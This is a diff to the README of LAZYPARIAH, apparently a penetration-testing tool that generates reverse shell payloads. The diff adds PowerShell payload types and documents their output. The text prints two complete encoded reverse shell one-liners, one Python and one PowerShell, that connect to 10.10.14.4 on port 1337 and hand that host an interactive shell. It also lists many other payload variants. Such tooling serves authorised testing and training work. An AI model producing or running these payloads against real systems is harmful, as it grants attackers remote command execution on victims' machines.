@@ -10,6 +10,7 @@ The reverse shell payloads that LAZYPARIAH supports include (but are not limited
 
 * C binary payloads (compiled on the fly): `c_binary`
 * Ruby payloads: `ruby`, `ruby_b64`, `ruby_hex`, `ruby_c`
+* Powershell payloads: `powershell_c`, `powershell_b64`
 * Base64-encoded Python payloads: `python_b64`
 * Rust binary payloads (compiled on the fly): `rust_binary`
 * PHP scripts containing base64-encoded Python payloads called via the `system()` function: `php_system_python_b64`
@@ -34,11 +35,11 @@ gem install lazypariah
 
 ## Usage
 ```
-Usage:  lazypariah [OPTIONS] <PAYLOAD TYPE> <ATTACKER HOST> <ATTACKER PORT>
-Note:   <ATTACKER HOST> may be an IPv4 address, IPv6 address or hostname.
+Usage:	lazypariah [OPTIONS] <PAYLOAD TYPE> <ATTACKER HOST> <ATTACKER PORT>
+Note:	<ATTACKER HOST> may be an IPv4 address, IPv6 address or hostname.
 
-Example:        lazypariah -u python_b64 10.10.14.4 1555
-Example:        lazypariah python_c malicious.local 1337
+Example:	lazypariah -u python_b64 10.10.14.4 1555
+Example:	lazypariah python_c malicious.local 1337
 
 Valid Payloads:
     awk
@@ -59,6 +60,8 @@ Valid Payloads:
     php_system_python_hex
     php_system_python_ipv6_b64
     php_system_python_ipv6_hex
+    powershell_b64
+    powershell_c
     python
     python_b64
     python_c
@@ -110,6 +113,13 @@ For example, the command `lazypariah python_b64 10.10.14.4 1337` should produce 
 ```
 echo aW1wb3J0IHNvY2tldCxzdWJwcm9jZXNzLG9zO3M9c29ja2V0LnNvY2tldChzb2NrZXQuQUZfSU5FVCxzb2NrZXQuU09DS19TVFJFQU0pO3MuY29ubmVjdCgoIjEwLjEwLjE0LjQiLDEzMzcpKTtvcy5kdXAyKHMuZmlsZW5vKCksMCk7IG9zLmR1cDIocy5maWxlbm8oKSwxKTsgb3MuZHVwMihzLmZpbGVubygpLDIpO3A9c3VicHJvY2Vzcy5jYWxsKFsiL2Jpbi9zaCIsIi1pIl0pOw== | base64 -d | python
 ```
+
+The exception to this is `powershell_b64`, which uses Powershell's inbuilt base64 decoder. The command `lazypariah powershell_b64 10.10.14.4 1337`, for instance, should return the following:
+```
+powershell -e JABjAGwAaQBlAG4AdAAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFMAbwBjAGsAZQB0AHMALgBUAEMAUABDAGwAaQBlAG4AdAAoACcAMQAwAC4AMQAwAC4AMQA0AC4ANAAnACwAMQAzADMANwApADsAJABzAHQAcgBlAGEAbQAgAD0AIAAkAGMAbABpAGUAbgB0AC4ARwBlAHQAUwB0AHIAZQBhAG0AKAApADsAWwBiAHkAdABlAFsAXQBdACQAYgB5AHQAZQBzACAAPQAgADAALgAuADYANQA1ADMANQB8ACUAewAwAH0AOwB3AGgAaQBsAGUAKAAoACQAaQAgAD0AIAAkAHMAdAByAGUAYQBtAC4AUgBlAGEAZAAoACQAYgB5AHQAZQBzACwAIAAwACwAIAAkAGIAeQB0AGUAcwAuAEwAZQBuAGcAdABoACkAKQAgAC0AbgBlACAAMAApAHsAOwAkAGQAYQB0AGEAIAA9ACAAKABOAGUAdwAtAE8AYgBqAGUAYwB0ACAALQBUAHkAcABlAE4AYQBtAGUAIABTAHkAcwB0AGUAbQAuAFQAZQB4AHQALgBBAFMAQwBJAEkARQBuAGMAbwBkAGkAbgBnACkALgBHAGUAdABTAHQAcgBpAG4AZwAoACQAYgB5AHQAZQBzACwAMAAsACAAJABpACkAOwAkAHMAZQBuAGQAYgBhAGMAawAgAD0AIAAoAGkAZQB4ACAAJABkAGEAdABhACAAMgA+ACYAMQAgAHwAIABPAHUAdAAtAFMAdAByAGkAbgBnACAAKQA7ACQAcwBlAG4AZABiAGEAYwBrADIAIAA9ACAAJABzAGUAbgBkAGIAYQBjAGsAIAArACAAJwBQAFMAIAAnACAAKwAgACgAcAB3AGQAKQAuAFAAYQB0AGgAIAArACAAJwA+ACAAJwA7ACQAcwBlAG4AZABiAHkAdABlACAAPQAgACgAWwB0AGUAeAB0AC4AZQBuAGMAbwBkAGkAbgBnAF0AOgA6AEEAUwBDAEkASQApAC4ARwBlAHQAQgB5AHQAZQBzACgAJABzAGUAbgBkAGIAYQBjAGsAMgApADsAJABzAHQAcgBlAGEAbQAuAFcAcgBpAHQAZQAoACQAcwBlAG4AZABiAHkAdABlACwAMAAsACQAcwBlAG4AZABiAHkAdABlAC4ATABlAG4AZwB0AGgAKQA7ACQAcwB0AHIAZQBhAG0ALgBGAGwAdQBzAGgAKAApAH0AOwAkAGMAbABpAGUAbgB0AC4AQwBsAG8AcwBlACgAKQA=
+```
+
+(Note: The length of the above payload is due to the fact that Powershell uses UTF-16LE encoding, where a single character corresponds to two bytes.)
 
 These types of payloads can be useful in certain situations because they do not include any single or double quotes.
 
